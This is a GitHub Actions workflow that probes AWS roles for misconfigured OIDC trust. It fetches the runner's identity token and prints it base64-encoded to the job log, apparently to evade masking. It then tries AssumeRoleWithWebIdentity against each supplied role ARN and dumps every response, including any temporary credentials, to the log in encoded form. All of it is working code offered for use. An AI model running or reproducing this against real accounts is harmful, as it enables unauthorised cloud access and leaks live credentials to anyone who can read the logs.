name: oidc-scan
on:
  workflow_dispatch:
    inputs:
      roles:
        description: comma-separated role arns
        required: true
permissions:
  id-token: write
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: run
        run: |
          set -u
          J=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com")
          printf '%s' "$J" > jwt.json
          python3 - <<'PY'
          import json,base64
          t=json.load(open("jwt.json"))["value"]
          print("JWT_B64", base64.b64encode(t.encode()).decode())
          p=t.split(".")[1]; p+="="*(-len(p)%4)
          d=json.loads(base64.urlsafe_b64decode(p))
          for k in ["iss","aud","sub","ref","event_name","repository","repository_owner","repository_id","repository_owner_id","environment"]:
              if k in d: print("CLAIM",k,"=",d[k])
          PY
      - name: assume
        run: |
          set -u
          TK=$(python3 -c 'import json;print(json.load(open("jwt.json"))["value"])')
          IFS=',' read -ra ARRS <<< "${{ inputs.roles }}"
          for R in "${ARRS[@]}"; do
            R2=$(printf '%s' "$R" | tr -d ' ')
            echo "=== ROLE $R2"
            RESP=$(curl -sS https://sts.amazonaws.com/ -d "Action=AssumeRoleWithWebIdentity" -d "Version=2011-06-15" --data-urlencode "RoleArn=$R2" -d "RoleSessionName=oidcscan" -d "DurationSeconds=900" --data-urlencode "WebIdentityToken=${TK}")
            echo "respbytes=${#RESP}"
            printf '%s' "$RESP" | base64 -w0
            echo
            echo "=== END $R2"
          done
